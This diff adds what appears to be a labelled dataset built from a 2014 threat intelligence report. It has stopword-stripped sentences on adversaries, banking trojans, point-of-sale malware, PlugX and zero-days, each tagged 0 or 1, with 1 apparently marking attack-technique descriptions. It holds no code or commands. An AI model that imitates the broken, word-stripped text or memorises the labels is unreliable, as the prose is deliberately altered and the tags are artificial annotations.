@@ -1,0 +1,1213 @@
+Intelligence powers everything	0
+Dive top threat actors attack vectors threat intelligence trends 2014	0
+Intro At CrowdStrike " Intelligence powers everything " This corporate slogan marketing theme	0
+It realization dedicated professionals focusing solving problems real strategic political financial impact customers	0
+When consider problems facing customers know intelligence allows make key decisions mean difference disaster triumph	0
+In earliest days building CrowdStrike drew heavily concepts encompassed Colonel John Boyd 's OODA loop ( OODA acronym Observe Orient Decide Act )	0
+It applied years manner decision - making situations	0
+The core OODA model decision - making process broken phases adversarial encounter two entities go process	0
+Whichever entity goes process fastest likely prevail	0
+The reason intelligence powers everything seek provide customers ability come decision ( last step OODA loop ) adversary thus ensuring favorable outcome	0
+In intelligence circles often referred decision advantage dealing adversaries trying compromise enterprise security want	0
+Throughout 2014 activity monitored CrowdStrike cyber domain reflective events unfolding real world	0
+This punctuated late 2014 - infamous attack attributed North Korean actors levied destructive malware flagrant assault private entity	0
+The actor case CrowdStrike traced back 2006 history using destructive code targets	0
+This actor launched attacks December usual adversary Republic Korea	0
+The highly publicized events initially suppressed release movie deemed offensive Democratic People 's Republic Korea resulted unprecedented awareness power one adversary wield target suitably motivated	0
+This final chapter 2014 closed year attribution adversary focus	0
+In May U.S.	0
+Department Justice concert various partners including CrowdStrike researchers disrupted infrastructure Gameover Zeus prolific Intro botnet scourge security practitioners across globe	0
+This disruption also impacted nefarious CryptoLocker malware provided pause adversary activity needed law enforcement levy charges take legal action permanently impact malware	0
+In month U.S.	0
+Department Justice charged five officers People 's Liberation Army military organ People 's Republic China violating 18 U.S.	0
+Code 1030	0
+In June CrowdStrike published detailed analysis actor associated 12th Bureau Third General Staff Department	0
+This report demonstrated direct lineage malware targeting variety western technology government targets individual Chinese intelligence service	0
+The events unfolded South China Sea near Paracel Islands emergence ISIS unrest Ukraine disappearance Malaysian airliner took cyber element	0
+This coincidence	0
+The nation - states world seeking aforementioned decision advantage know use interconnected computers allows collect intelligence gives ability make informed decisions	0
+Our customers rely us provide intelligence thwart attacks make informed decisions	0
+This report provide overview intelligence analyzed CrowdStrike team past year	0
+Wrapping much analysis one report means lot tough decisions needed made include	0
+This report structured provide Key Findings first	0
+Following key findings graph data based patterns emerged though visibility attained CrowdStrike team ; meant provide snapshot dozens adversaries tracked year	0
+In Notable Activity section cover three motivations see Criminal Targeted - Intrusion Hacktivist / Activist	0
+We explore notable activity around zero - day exploits event - specific operations conducted adversaries	0
+There many interesting actors discovered year even advanced previous years ; Know Adversary section contains interesting observations adversaries intelligence reports publish subscription service	0
+Finally provide analysis 2013 report predictions past year forecast expect 2015	0
+In 2014 became abundantly clear threat intelligence would provide decisive advantage protecting network	0
+The CrowdStrike Global Intelligence team observed significant activity 39 different criminal hacktivist state - sponsored nationalist adversaries	0
+State Union During 2014 CrowdStrike Intelligence observed significant activity 39 state - sponsored nationalist adversaries targeting numerous verticals globe	0
+The charts provide high - level illustration targeting	0
+There takeaways data	0
+Vietnam GOBLIN PANDA respectively targeted country active adversary	0
+From late spring summer GOBLIN PANDA conducted consistent targeted intrusion operations targeting organizations Vietnam focused tensions South China Sea	0
+These campaigns relied primarily spear phishing malicious documents dropped malware ( mostly PlugX ) along Vietnamese- language decoy documents	1
+The content decoys often came documents produced Vietnam 's government indicates adversary possibly infiltrated government 's network using stolen documents operations	0
+The frequency GOBLIN PANDA 's operations targeted activity aimed Vietnam general tailed final months 2014 volume activity spring summer enough push top CrowdStrike 's targeting stats	0
+Observed Adversary Activity During 2014 State Union Significant Targeting Country 2014 PlugX far used malware variant targeted activity 2014	0
+It proliferated greatly amongst China - based targeted intrusion adversaries appears tool choice many	0
+The malware around years used multiple Chinese actors quite time ; however frequency PlugX use 2014 revealed prominent	0
+PlugX used advanced China - based adversaries AURORA PANDA adversaries lower level sophistication GOBLIN PANDA	0
+The reason prevalence clear	0
+It possible central malware dissemination channel supplying many Chinese adversaries many groups using	0
+It also possible groups using past recently able obtain via underground public malware repositories	0
+State Union	0
+The stats also reflect wide range malicious cyber activity associated numerous events	0
+The conflict Ukraine resulted targeted intrusion activity Russia - based China- based adversaries	0
+Adversaries nexus Iran also active 2014 targeting western government entities well private organizations particularly defense sector	0
+Elections also heavily targeted 2014 Ukraine Hong Kong Umbrella Revolution garnered great deal attention Chinese actors	0
+These number topics covered detail sections	0
+Financial crime malware changed threat landscape point - of- sale malware became increasingly prevalent China - based adversaries continued proliferate targeted intrusion space	0
+Notable Activity Criminal Cybercrime Trends 2014 2014 extremely active year cybercrime	0
+Financial Trojans grew complexity penetration	0
+Two major banking botnets – Gameover Zeus ( GOZ ) Shylock – dominated first half year	0
+Their development focused ability deliver complex web injection scripts used overcome two - factor authentication online banking security	0
+Two large successful disruptions mounted mid - year CrowdStrike assisting June takeover GOZ ( see next section ) Shylock taken July	0
+For time left void space adversaries quick adapt	0
+With many services catered GOZ Shylock still operation inevitable botnets would step plate	0
+CrowdStrike observing two new major contenders space Dyreza Dridex also known Bugat	0
+Dyreza takes simplistic approach banking fraud acting intercept logins perform malicious actions acquiring HTTP POST data banking SSL sessions	1
+Dridex uses classic banking Trojan tactic relying complex JavaScript web injects targeted institutions wishes steal	0
+Both threats rely criminal ecosystem predecessors	0
+Upatre loader previously used delivering GOZ used deliver Dyreza known loaders Andromeda Smoke Loader Pony Loader continue developed order deliver primary payloads	0
+The Cutwail Pushdo botnets previously tasked distributing loaders GOZ since retasked alongside spamming botnets delivering number phishing lures ultimately lead infection persistent payloads	0
+Dridex example favors Word documents obfuscated macros	0
+These macros allowed execute reach download first - stage loaders install Dridex payload onto victim machine	1
+Notable Activity In addition changing banking Trojan landscape ransomware also undergone major shift throughout 2014 - particular becoming much professionally organized	0
+CryptoLocker 's success made first ransomware variant make prime - time news	0
+Its success part due wide distribution acting alternative revenue stream operators GOZ	0
+When GOZ dismantled CryptoLocker also taken place many copycat ransomware families trying replicate success CryptoWall TorrentLocker	0
+So expected cybercrime landscape 2015 ? CrowdStrike predicts continuation development banking Trojans Dyreza Dridex	0
+As recently November Dridex added Peer - - Peer ( P2P ) functionality arsenal attempt become resilient likely changes capability continue	0
+In addition likely new threats follow business model using phishing lures delivered spambots using range first - stage loaders keep primary payloads radar	0
+Ransomware continue become threat continued copycats try develop next market leader	0
+Gameover Zeus Takedown Gameover Zeus ( GOZ ) complex P2P botnet one prevalent cyber threats almost four years	0
+It forked infamous Zeus Trojan source code leaked spring 2011 – months appearance first GOZ version	0
+GOZ largely used banking fraud delivery malware CryptoLocker ransomware Trojan believed caused $ 100 million financial damage	0
+The GOZ botnet long believed resistant takedown attempts complex tiered infrastructure Infected machines form decentralized P2P network peers acting proxy nodes ( brokers bots next tier )	0
+This upper tier consists proxies conceal location actual back end	0
+The use P2P technology eliminates static rendezvous points allows botnet operators announce new centralized components time makes Notable Activity efforts pointless	0
+On top fallback mechanism generates weekly - changing deterministic set 1,000 domain names botmaster register order serve fresh peer lists	0
+Bots fail establish contact P2P network would consult Domain Generation Algorithm ( DGA ) order retrieve new set peers	0
+Finally communication botnet encrypted	0
+In June 2014 botnet disrupted coordinated effort called Operation Tovar culmination months technical investigation legal wrangling	0
+The botnet disrupted taking infrastructure time preventing access botmasters	0
+While effort take account block different communication channels primarily focused P2P network complex component	0
+By propagating specially crafted messages botnet infrastructure degenerated bots redirected sinkholes	0
+The CrowdStrike Intelligence team provided technical expertise permit enforcement Temporary Restraining Order ( TRO ) successfully disrupted infamous Gameover Zeus botnet also CryptoLocker	0
+In addition technical disruption U.S.	0
+Department Justice filed indictment individual called Evgeniy Mikhailovich Bogachev believed behind GOZ botnet well several unnamed co - conspirators	0
+Point - - Sale Malware Related Intrusions Credit card fraud traditionally popular cybercrime scene	0
+In cases credit card data stolen website breaches exposed data usually consists card numbers expiration dates cardholder names card security codes	0
+However data alone always possible accurately recreate found card 's magnetic strip	0
+In criminal marketplace card track data therefore generally highly valued information mentioned used multiple ways including manufacturing counterfeit credit cards	0
+Throughout 2014 CrowdStrike Intelligence investigated several large Notable Activity breaches U.S.	0
+companies retail sector	0
+These breaches involved targeting Point - - Sale ( PoS ) terminals order plunder consumer credit card information	0
+By infecting terminals malware specifically designed steal credit card information cards swiped customers attackers able collect data hundreds thousands credit cards	0
+Running background terminal malware would continuously scan memory unique patterns found card 's magnetic strip exfiltrate matching data adversary - controlled server	0
+Notable Activity Target Breach On 19 December 2013 U.S .- based retailer Target released statement confirming breach providing estimate total scope	0
+According statement actors able steal data approximately 40 million credit cards 70 million individuals ' records Personally Identifiable Information ( PII )	0
+From reporting breach publicly speculated actors able access Target 's network via credentials stolen Pennsylvania - based HVAC contractor provided services Target	0
+In January 2014 CrowdStrike Intelligence analyzed several files incident	0
+One files PoS malware named Kaptoxa ( also known mmon ) used component another PoS malware BlackPoS.	0
+This copy Kaptoxa continuously scanned volatile memory infected systems patterns looked like credit card numbers logged file transferred internal network share regular intervals	1
+Another utility deployed onto network shares perform final exfiltration step data transferred external FTP servers	1
+In January 2014 CrowdStrike identified malware staging site hosting copy BlackPoS source code	0
+While believed site linked Target breach analysis source code provided additional insight simplicity tools	0
+Compared crimeware families PoS malware relatively simple design functionality	0
+The malware used accept tasking controllers external systems ; sole function scan log exfiltrate data found	0
+Despite simplistic nature tools adversary behind Target breach demonstrated sophisticated tradecraft mounting successful operation primarily taking full advantage initial stolen credentials laterally move throughout targeted network PoS systems	0
+The Rise Commodity PoS In 2014 several major companies coping breaches PoS infrastructure many smaller retailers facing threat less - organized groups	0
+In underground marketplaces ready - - use PoS malware kits becoming commonly available	0
+Notable Activity Malware BlackPoS requires bit strategic planning part adversary ; much system lacks point - - click intuitive nature commodity botnets	0
+For less - organized less - skilled adversary groups - - shelf kit Dexter PoS may allow exploitation offensive capabilities may otherwise possible	0
+Dexter CrowdStrike Intelligence reported 2013 became one publicly known PoS malware kits market	0
+By late 2014 source code Dexter publicly available several criminal forums	0
+The malware scans memory Track 1 Track 2 credit card data exfiltrates findings back control servers HTTP requests	1
+Dexter Command- - Control Panel Dexter offers adversary clean simple control panel allows infected host management viewing obtained data	0
+In 2014 CrowdStrike investigated several kits similar Dexter including vSkimmer JackPoS also focused stealing credit card numbers infected terminals	0
+Many lacked technical sophistication generally found effective identifying exfiltrating found data	0
+Notable Activity State Targeted Intrusion Trends 2014 Incidents targeted intrusion activity related nation - state interests increase past several years	0
+Different states ' activities often reflect national interests agendas deepest concerns	0
+As example Chinese nation - state actors appeared clearly align plan operations support real - world activities case Haiyang Shiyou 981 oil platform	0
+In direct contradiction pre - planned operations case Umbrella Revolution dominated streets Hong Kong summer fall 2014 Chinese adversary groups observed broadly targeting organizations related civil unrest wild attempt collect intelligence protestors movements	0
+During course 2014 CrowdStrike observed continued proliferation targeted intrusion activity	0
+Nation - states understand value collecting intelligence information domain mobilizing resources capitalize intelligence opportunities exist	0
+While CrowdStrike Intelligence team identified analyzed well dozen new adversary groups worldwide 2014 several general interest	0
+FLYING KITTEN FLYING KITTEN adversary believed operating Islamic Republic Iran	0
+This group first observed initiating targeted intrusion activity late 2013 continued active throughout 2014	0
+In January 2014 CrowdStrike became aware ongoing operation actor targeting company defense industrial base United States	0
+This campaign leveraged fake websites trick users entering credentials concurrently serve malware poses software updates legitimate applications	1
+Shortly activity identified campaigns additional targets defense aerospace sectors observed	0
+Evidence supporting attribution FLYING KITTEN Iran found secondary focus targets Iranian dissidents foreign countries well Iran	0
+Notable Activity A common tactic FLYING KITTEN set spoofed login web pages domains closely resemble legitimate pages used targets	0
+These fake web pages serve two purposes They log credentials entered users believe page legitimate authentication mechanism redirect another page prompts download alleged patch update fact copy remote access tool	0
+This tool used log keystrokes screenshots user activity infected systems exfiltrates data attacker - controlled server	1
+The primary remote access tool used FLYING KITTEN dropper written C # .NET generally uses filename	0
+The files dropped stored .NET resources embedded executable	0
+When executed extracts deploys backdoor Trojan configuration file optionally decoy ( image legitimate executable )	1
+Likewise backdoor executable also written C # meaning decompiled back representation original source code	0
+This code lists several classes telling names Stealer Browser Stealer Keylogger Stealer Messenger	0
+Further code contains transcripts Farsi language artifacts e.g. HavijeBaba salam!*% # shown	0
+In addition aerospace / defense dissident targeting appears FLYING KITTEN also engaged broader targeting via website parmanpower.com purported website business engaged recruiting training development Erbil Iraq	0
+The Whois record Notable Activity website domains related activity discussed indicates also use adversary actual purpose website still unknown	0
+The registrant email currently appears Whois records many observed domains info@usa.gov.us	0
+However historical records show domains originally registered email address keyvan	0
+ajaxtm@gmail.com ties back Iran - based entity called Ajax Security Team	0
+This group known low - level web defacements SQL injection attacks time	0
+Until early 2014 Ajax Security easily identifiable presence Internet website related Facebook pages	0
+This Internet presence decreased significantly likely due desire keep lower profile group engaged targeted intrusion activity	0
+CHARMING KITTEN In late May public reporting released Iran - based adversary leverages fake personas social networking sites order conduct social engineering ultimately targeted attacks desired targets	0
+This adversary CHARMING KITTEN known CrowdStrike Intelligence since January 2014 observed targeting individuals U.S.	0
+government defense sectors	0
+CHARMING KITTEN engaged credential collection malware operations	0
+Credential collection occurred spoofed websites meant appear legitimate sites YouTube	0
+When victims clicked log link redirected different website prompted enter credentials harvesting adversary	0
+The malware used adversary Internet Relay Chat ( IRC)-based malware variant referred Parastoo IRC password uses	0
+This malware possesses Notable Activity extensive command set capable conducting reconnaissance victim machines deleting files downloading files exfiltrating data	1
+A number factors support CHARMING KITTEN 's nexus Iran	0
+First " Parastoo " password used malware Iranian word used refer small birds	0
+Also adversary used Iran - based web hosting providers infrastructure host malicious domains	0
+Finally one droppers related one identified Parastoo variants dropped Persian - language decoy document purporting Iran 's Ministry Interior	0
+PlugX – The Panda 's Tool Choice CrowdStrike observed upward trend use PlugX Remote Access Tool ( RAT ) malware 2014	0
+Multiple adversary groups used PlugX target number sectors countries surrounding China 's sphere influence particularly involved science & technology government defense	0
+Further afield PlugX used persistent campaigns commercial entities United States well target organizations involved counter - terrorism political efforts worldwide	0
+Attacks associated GOBLIN PANDA observed increasing rate throughout latter half year closing months 2014 CrowdStrike investigated several instances PlugX activity consistent HURRICANE PANDA PALE PANDA adversaries	0
+Other China - based adversaries observed using PlugX operations include AURORA PANDA NIGHTSHADE PANDA PREDATOR PANDA EMISSARY PANDA WET PANDA	0
+The upward trend use PlugX indicates increasing confidence capabilities platform justifying continued use across multiple sectors countries	0
+PlugX existed form since 2008 evolved time offer new capabilities control mechanisms supported active development program	0
+It provides attacker range functionality including ability log keystrokes ; modify copy files ; capture screenshots video user activity ; perform administrative tasks Notable Activity terminating processes logging users rebooting victim machines	1
+A full command shell also provided access cmd.exe process sends output PlugX instance named pipes onward relay attacker 's Command - - Control ( C2 ) servers	1
+While capabilities unusual RAT comparable provided Poison Ivy tools PlugX also offers range C2 protocols execution options help reduce risk detected network defenders	0
+Over time capabilities augmented additional releases versions plugins turn deployed adversaries active ongoing campaigns	0
+For example GOBLIN PANDA observed using PlugX internal version numbers 20140101 campaigns since Q2 2014 migrating deployments 20140606 versions second half year	0
+PlugX frequently delivered targets via spear phishing attack containing malicious RTF Word document leveraging exploit code popular CVE-2012 - 0158 vulnerability	1
+Some adversary groups also attempted leverage CVE-2014 - 1761 vulnerability way maximize chance exploitation recently patched systems varying degrees success	0
+Attacks also identified using PowerPoint Excel file formats well self - extracting RAR files plain executables email attachments	0
+However PlugX installed victim machine typically three files dropped file system exploitation enable initial start - malware legitimate digitally signed application ; encrypted file containing PlugX payload ; malicious dynamically - linked library used load malware using Dynamic Link Library ( DLL ) side - loading technique legitimate application executed	1
+This methodology provide level protection threat detection techniques employed anti - virus software packages parent process non - malicious executable	0
+Often computer security tool component commercial anti - virus application used purpose likely take advantage process whitelisting strategies may place network	0
+Notable Activity Command control PlugX malware facilitated using range protocols including HTTP binary channel ICMP	0
+During 2014 CrowdStrike observed increased use newer DNS C2 module transmits data lengthy DNS queries adversary - controlled infrastructure	0
+While mechanism deviates typically monitored protocols verbosity communication using module may provide opportunities detection proactive analysis traffic leaving network	0
+Further demonstrating continued development platform CrowdStrike observed modifications HTTP DNS requests produced PlugX throughout year presenting adapting challenge detection threat	0
+However adversary groups registered domains course 2014 use PlugX C2 ( e.g. proxyme.net ) continued use domain names active number years indicating effectiveness infrastructure extended periods time	0
+The ongoing development PlugX provides attackers flexible capability requires continued vigilance part network defenders order detect reliably	0
+There currently clear evidence suggest use PlugX proliferated adversaries attributed outside China ; increase deployment last year could precursor future worldwide use particularly PlugX succeeds legacy capabilities Poison Ivy adversary tool choice	0
+Notable Activity Hacktivist / Nationalist Hacktivist- nationalist - motivated cyber actors third class adversary tracked CrowdStrike Intelligence team	0
+The goals actors may range causing mischief laughs influencing opinions views particular issue	0
+During course 2014 notable events demonstrate capabilities actors	0
+As electronic voting continues used countries targeting processes equipment continue expand	0
+Operations Targeting Elections In July 2014 electronic voter registration system then- upcoming Tunisian presidential election suffered cyber attack rendering registrations impossible unknown amount time	0
+Sources reported authorities control attack systematic process intended strike electoral process	0
+This incident yet another example cyber attacks targeting electronic voting systems manipulate outcome	0
+CyberBerkut In February 2014 several bloody protests took place Ukraine resulting ousting pro - Russia prime minister interim government created goal creating closer ties European Union ( EU )	0
+Following protests CyberBerkut self - proclaimed nationalistic hacking group began taking credit hacks Ukrainian interim leaders	0
+The group extremely proactive distributing propaganda decrying new government recruiting pro - Russia supporters engage participatory Distributed Denial Service ( DDoS ) attacks multitude Ukrainian government media sites	0
+These attacks likely directed Russian state services CyberBerkut hacktivists providing layer plausible deniability	0
+Several DDoS attacks Ukraine 's Central Election Commission ( CEC ) coincided Russian state media broadcasts suggesting coordination state level	0
+In one case attack CEC occurred around time election results supposed appear simultaneous broadcast Russian state media appeared show false Notable Activity results extremist candidate election hefty margin	0
+The goal operation likely cause temporary confusion immediate results election cause observers question legitimacy elections touted fair well equipped withstand attacks	0
+Had operation successful likely would incited unrest Ukraine supported Russian narrative elections illegitimate Russian intervention needed prevent Ukraine slipping complete chaos	0
+Whereas previous conflicts Russia former Soviet states Estonia Georgia saw much heavier use cyber tactics used bring critical infrastructure disrupt communications efforts Ukraine appeared muted designed disinformation campaign stir unrest order Russia intervene Ukraine " peacekeeper " role Crimea	0
+The widespread publicity conflict received global media along threat heavy sanctions imposed west may factor preventing aggressive cyber action Russia	0
+Although campaign appeared ultimately unsuccessful partly due prepared Ukrainian defense CrowdStrike noted several interesting observations	0
+Though use proxy carry attacks purposes plausible deniability hardly new coordination propaganda distributed Russian media reporting particularly telling regard Russian state services direct many moving parts unison achieve goals via cyber means	0
+In addition participatory DDoS client software CyberBerkut advertised help launch DDoS attacks Ukrainian government actually installed backdoor victims ' machines presumably enabling Russian intelligence services make new botnet compromised " volunteers " could used future conflicts	0
+CrowdStrike Intelligence also investigated targeted attacks CyberBerkut Ukrainian organizations entities operating business Ukraine	0
+CyberBerkut first observed March 2014 made statements illegitimacy government took Ukraine Notable Activity upon ousting former president Viktor Yanukovych	0
+Around time group launched DDoS attacks state - controlled media country well NATO entities Cooperative Cyber Defense Center Excellence ( CCDCOE )	0
+In April CyberBerkut claimed responsibility defacing websites several private military companies – Greystone Triple Canopy Academi – claimed operating ground Ukraine	0
+CyberBerkut 's operations 2014 much line priorities Russian state ; however unclear activity directly state sponsored independent group carrying attacks motivated Russian nationalistic ideals	0
+Umbrella Revolution First observed late 2013 People 's Republic China ( PRC ) steadily increased use intelligence services cyber operations Hong Kong part response protests supporting universal suffrage democracy headed Occupy Central ( 和平占中 )	0
+The Hong Kong protests fueled fears Chinese Communist Party ( CCP ) perceives threat one - party rule mainland China	0
+This perceived threat likely prompted flurry malicious cyber activity taken various organizations citizens operating support protests within Hong Kong later dubbed Umbrella Revolution	0
+The methods used smattering cyber tactics human intelligence ( HUMINT ) methods collect information leaders Occupy Central Movement locations supporters well gain overall picture Hong Kong citizens ' perception protests	0
+This began strategic web compromises key websites associated Occupy Central late 2013 followed extensive HUMINT activities carried early 2014 suspected Ministry State Security ( MSS ) officers likely Notable Activity designed elicit information influential figures Hong Kong pressure support Beijing 's stance exchange gifts	0
+The protests reached critical point democratic online referendum held June 2014 calling open elections Hong Kong 's chief executive	0
+At peak voting online hosting system Popvote ( one point exceeded 500 gbps traffic ) suffered massive DDoS attack	0
+The attackers persistent scaled attacks defenders responded attack starting Layer 3 4 attacks progressively using advanced Layer 7 attacks	0
+Though voting system persist drew 780,000 votes apparent effort PRC went referendum substantial	0
+As protests persisted PRC appeared increase attempts monitor protestors proliferating mobile malware Android iOS operating systems	0
+The mobile Remote Access Tools ( mRATs ) authored two individuals extensive ties legacy Chinese hackers likely contracted customize malware purpose monitoring protestors ' communications physical locations	0
+In addition specialized attacks extensive censorship Umbrella Revolution mainland China PRC appears taken shotgun approach handling protests persisted	0
+Several known China - based groups including MAVERICK PANDA VIXEN PANDA TEMPER PANDA SABRE PANDA HURRICANE PANDA observed participating activity related protests suggesting possible cross- divisional tasking CCP saw support protests increase	0
+This demonstrates variety approaches China dealing threat CCP 's one - party rule	0
+Along mobile targeting citizens Hong Kong shows new level brazenness becoming increasingly common Chinese cyber operations	0
+LizardSquad / DerpTrolling DerpTrolling The hacking collective DerpTrolling made early 2014 media headlines Notable Activity claiming string DDoS attacks multiple gaming companies online gaming servers	0
+The group likely originated Steam gaming community suspected members engaged early DDoS attacks rival gaming clans servers	0
+DerpTrolling 's antics often childish clear motive " lulz " boost egos	0
+For reason classified hacktivists	0
+Despite immaturity collective able consistently carry DDoS attacks targets choosing attacks real - world effect victims within gaming community	0
+The attacks particularly noteworthy DDoS tool dubbed Gaben Laser Beam ( GLB ) Gabe Newell creator Half - Life Steam community supposedly created attack exceeded 400 gbps network traffic utilizing NTP reflection attack	0
+This suggested DerpTrolling possessed - average knowledge network protocols	0
+While NTP reflection commonly known security community " script kiddies " " skids " aware advanced techniques involving amplification allows fewer devices needed pull larger DDoS attacks	0
+DerpTrolling reportedly several run - ins law enforcement though unclear much verifiable versus ploy increase notoriety	0
+One supposed encounter resulted group going silent several months returning carrying lower - level attacks gaming community	0
+Given collective 's poor operational security practices likely members actively tracked law enforcement agencies continue maintain high- profile attacks evading capture	0
+LizardSquad Another group begin DDoS operations targeting gaming community 2014 LizardSquad	0
+The group characterized DerpTrolling much less skilled however may overlap members groups	0
+At time LizardSquad shown advanced amplification techniques used previously DerpTrolling	0
+LizardSquad quickly rose prominence several media stunts drew Notable Activity significant attention press well law enforcement	0
+LizardSquad began claiming affiliates Islamic State Iraq Syria ( ISIS ) also called bomb threat grounding flight Sony Online Entertainment executive passenger	0
+Though group appears terrorist ties antics quickly gained notoriety	0
+LizardSquad even poorer operational security practices DerpTrolling allowed CrowdStrike easily provide attribution possible members group	0
+In addition group also admitted renting botnets running booters confirming skill level relatively low	0
+Despite threat posed gaming companies still noteworthy especially combined terrorist threats ; although bluster still considerable real - world consequences	0
+DEADEYE JACKAL Far From Dead Although DEADEYE JACKAL n't kind coverage media around high- profile hacks group still active	0
+It still conducts occasional mass defacements focusing improving strengthening dissemination pathways including migrating private social media adding mobile site Android app	0
+DEADEYE JACKAL even developed released Linux - based operating system called SEANux end October 2014	0
+DEADEYE JACKAL continues international censorship online articles deems detrimental Syria Syrian President Bashar Assad	0
+On Thanksgiving group defaced 60 websites including media websites.1 The websites primarily United States United Kingdom also included Japan Canada Philippines New Zealand Mexico South Africa	0
+A message DEADEYE JACKAL 's Twitter account showed possible motivations outside opportunistic targeting saying " The press Please n't pretend # ISIS civilians "	0
+The recent cyber attack DEADEYE JACKAL 18 December 2014 group hacked website International Business Times remove article due coverage Syria DEADEYE 1 " Syrian Electronic Army hacks several websites Forbes Ferrari Independent Daily Telegraph many websites hijacked " 27 November 2014 http://www.techworm	0
+net/2014/11/syrian - electronic - army - hacks - sev- eral - websites - forbes - ferrari - independent - dai- ly-telegraph-many-websites-hijacked.html 2 " Syrian Electronic Army hacks International Business Times ( IBT ) alleged false coverage Syria " 18 December 2014 http://www	0
+techworm.net/2014/12/syrian - electronic - ar- my-hacks-international-business-times.html 3 See " The Syrian Army Shrinking Assad Running Out Soldiers " 17 December 2014 http://www.ibtimes.com/ syrian - army - shrinking - assad- running - - soldiers-1761914 Notable Activity JACKAL perceived false.2 The deleted article discussed depleting military resources President Assad terms soldiers since start U.S.	0
+campaign Syria Islamic State	0
+The article however soon reposted International Business Times remains available.3 DEADEYE JACKAL used limited operating website Twitter account Facebook account proved problematic ways since communications could terminated easily Twitter Facebook decided shut accounts	0
+It became joke DEADEYE JACKAL many Facebook pages could start would shut	0
+However DEADEYE JACKAL realize stable varied dissemination pathways messaging needed	0
+Additionally group decided also needed communications would less chance monitored enemies	0
+In September 2013 DEADEYE JACKAL changed email provider Gmail Mail.ru	0
+The change likely result suspicions emails monitored light leaks made Edward Snowden earlier 2013	0
+In moves protect privacy DEADEYE JACKAL opened accounts VK formerly VKontakte4 ( Russia - based social media website similar Facebook owned Mail.ru Group Ello5 ) new social media website boasts sell ads users ' data advertisers	0
+It also allow data mining users site	0
+DEADEYE JACKAL also launched mobile site website Android app	0
+These addition group 's already - established accounts Pinterest6 Instagram7 YouTube8 Twitter9	0
+Most notably group developed released operating system called SEANux	0
+SEANux offers little overall improvement Linux- based systems like Kali BackTrack	0
+SEANux automatically loads desktop system monitor makes several network requests creating sidebar	0
+The sidebar provides user information system running processes weather ( Damascus DI Syria ) currency rates high - level information	0
+Also side bar small window feed news DEADEYE JACKAL 's website10	0
+Notable Activity The notable aspect SEANux tools offers	0
+SEANux offers standard offensive / pentesting tools including Metasploit Framework SQLMap nMap Aircrack John Ripper	0
+There also included directory miscellaneous PHP Perl scripts however appear created DEADEYE JACKAL	0
+SEANux also offers custom set offensive / pentesting tools including	0
+DEADEYE JACKAL attempted ruse Anonymous 2012 released Anonymous - OS found riddled Trojans	0
+SEANux connect DEADEYE JACKAL - controlled Notable Activity resources RSS feed images webshells Firefox custom SEANux homepage	0
+It possible DEADEYE JACKAL monitor see connecting resources outside operating system functions normally	0
+FRATERNAL JACKAL In 2012 2013 four - phased attack known Operation Ababil OpAbabil conducted group Iranian actors targeting U.S.	0
+financial institutions DDoS attacks	0
+This adversary CrowdStrike tracks name FRATERNAL JACKAL suspected ties Iranian government	0
+It known increase attack volume periods economic tension Iran western countries	0
+Despite suspicion political motivations group publicly attested several Pastebin.com posts motivation attacks negative depictions Muslim Prophet Muhammad several YouTube videos	0
+Attacks adversary group primarily conducted using botnet public - facing web servers exploited vulnerable Content Management Systems ( CMS )	0
+Unlike traditional botnets infected hosts connect control servers tasking within FRATERNAL JACKAL 's botnet nodes directly tasked adversary multiple layers infrastructure	0
+CrowdStrike Intelligence continued actively investigate adversary 2014 specifically seeking means propagated botnet	0
+In October PHP script identified connection adversary	0
+This script used scanning lists domains parsing domain 's robots.txt file identify server running CMS Joomla	0
+Domains identified script directly posted hard - coded control server something seen previously CrowdStrike adversary 's toolkit	0
+Normally performing server reconnaissance parsing robots.txt file server trivial task	0
+However looked context adversary 's strategic operations suggests adversary Notable Activity using first - stage infrastructure offensive actions targets also expansion botnet	0
+Despite FRATERNAL JACKAL longer publicly posting motivations notices upcoming attacks Pastebin botnet remains online capable performing attacks	0
+It likely event future tensions Iran western countries group may publicly resurface continue attack campaigns	0
+2014 Zero - Day Activity The occurrence zero - day previously unknown vulnerability exploited wild generally unusual occurrence	0
+These events almost always tell interesting story initially discovered	0
+During course 2014 hundreds newly identified vulnerabilities categorized Mitre Common Vulnerabilities Exposures ( CVE ) system	0
+Many identified researchers vendors auditing proactive security reviews	0
+In cases vulnerabilities first identified used adversaries ( development proliferation vulnerabilities fascinating component threat landscape )	0
+There several events occurred year ; three particularly interesting adversary perspective namely CVE-2014 - 0322 CVE-2014 - 4113 CVE- 2014 - 1761	0
+There numerous interesting exploits identified year many used various adversaries SSL Heartbleed attack ( CVE- 2014 - 0160 ) ShellShock Bourne Again Shell ( BASH ) vulnerabilities ( CVE-2014 - 6271 CVE-2014 - 6277 CVE-2014 - 6278 CVE-2014 - 7169 CVE- 2014 - 7186 CVE-2014 - 7187 )	0
+These exploits necessarily exemplary related adversary narrative helps determine " " behind attacks CrowdStrike focuses intelligence standpoint	0
+CVE-2014 - 0322 - Internet Explorer Arbitrary Code Execution This zero - day vulnerability Microsoft Internet Explorer allowed code execution via specially crafted JavaScript code making ideal Strategic Notable Activity Web Compromise ( SWC ) drive - operations	0
+There two primary campaigns associated CVE-2014 - 0322	0
+The first publicly identified occurred February 2014 hosted website Veterans Foreign Wars ( VFW )	0
+This incident delivered fairly common publicly available RAT called ZxShell connected C2 newss.effers.com	1
+This domain CrowdStrike associates AURORA PANDA adversary	0
+Investigation VFW incident led discovery sites ( savmpet.com gifas.assso.net icbcqsz.com ) also hosting exploit code	0
+These sites shared IP address also contained content taken website French aerospace industries association Groupement des Industries Fran aises A ronautiques et Spatiales ( GIFAS )	0
+The dates visible webpages dates found pages ' source code indicated created 17 January 2014 predated VFW incident nearly month	0
+However operation utilized drive - tactics rather SWC sites hosting code controlled adversary compromised legitimate sites	0
+The GIFAS - related activity delivered different malware payload ( Sakula ) VFW incident ( ZxShell )	0
+The Sakula payload communicated entirely different C2 infrastructure ZxShell oa.ameteksen.com	0
+This indicates different adversary responsible GIFAS- related SWC operation	0
+Further investigation activity showed number similarities 2012 zero - day ( CVE-2012 - 4792 ) SWC campaign leveraged website U.S .- based manufacturer Capstone Turbine	0
+These similarities use Sakula malware GIFAS - based subdomains related incidents use zero - day vulnerabilities	0
+At end 2014 CrowdStrike Intelligence also discovered potential links adversary HURRICANE PANDA adversary ( discussed detail ) ; however evaluation connections still ongoing	0
+CVE-2014 - 4113 – Local Privilege Escalation Every adversary reveals trump card Notable Activity become desperate access victim 's infrastructure	0
+This occurred October 2014 Chinese adversary tracked CrowdStrike HURRICANE PANDA deployed tool called Win64.exe compromised system used invoke programs elevated privileges	1
